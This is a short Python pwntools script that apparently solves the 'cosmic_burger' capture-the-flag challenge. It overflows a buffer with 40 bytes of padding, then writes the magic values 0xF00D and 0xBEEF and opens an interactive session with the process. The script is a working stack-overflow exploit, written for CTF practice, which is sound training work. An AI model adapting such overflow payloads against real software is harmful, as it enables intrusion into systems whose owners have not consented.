from pwn import *

context.binary=elf=ELF("./cosmic_burger")
#p=remote("offsec.m0lecon.it",13541)
p=process(elf.path)
offset=32+8
sauce = 0xBEEF
cheese = 0xF00D
ret=ROP(elf).find_gadget(['ret'])[0]

p.recvuntil(b"order?")

payload=flat(
    b'b'*offset,
    p32(cheese),
    p32(sauce)

)
#gdb.attach(p)
p.sendline(payload)
print(p.recv())
p.interactive()
